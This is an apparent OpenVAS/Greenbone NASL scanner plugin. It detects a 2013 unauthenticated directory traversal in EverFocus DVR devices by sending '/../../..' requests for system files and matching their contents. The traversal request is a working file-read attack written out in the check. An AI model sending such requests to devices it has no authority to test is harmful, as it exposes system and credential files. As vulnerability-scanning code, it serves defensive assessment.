if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103682" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "cvss_base", value: "7.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:N/A:N" );
	script_name( "EverFocus Multiple Devices Directory Traversal" );
	script_xref( name: "URL", value: "http://packetstormsecurity.com/files/120827/DDIVRT-2013-50.txt" );
	script_xref( name: "URL", value: "http://www.everfocus.com/firmware_upgrade.cfm" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2013-03-20 10:34:19 +0100 (Wed, 20 Mar 2013)" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2013 Greenbone Networks GmbH" );
	script_dependencies( "gb_get_http_banner.sc", "os_detection.sc" );
	script_require_ports( "Services/www", 80 );
	script_require_keys( "Host/runs_unixoide" );
	script_mandatory_keys( "EverFocus/banner" );
	script_tag( name: "solution", value: "Firmware update is available from EverFocus technical support." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "summary", value: "Multiple EverFocus devices allowing unauthenticated remote users to retrieve arbitrary
  system files that are located outside of the web root through a directory traversal on
  port 80." );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
require("misc_func.inc.sc");
port = http_get_port( default: 80 );
banner = http_get_remote_headers( port: port );
if(!banner || !IsMatchRegexp( banner, "realm=\"(EPARA|EPHD|ECOR)[^\"]+\"" )){
	exit( 0 );
}
files = traversal_files( "linux" );
for pattern in keys( files ) {
	file = files[pattern];
	url = "/../../../../../../../../../../../../../../../" + file;
	if(http_vuln_check( port: port, url: url, pattern: pattern )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

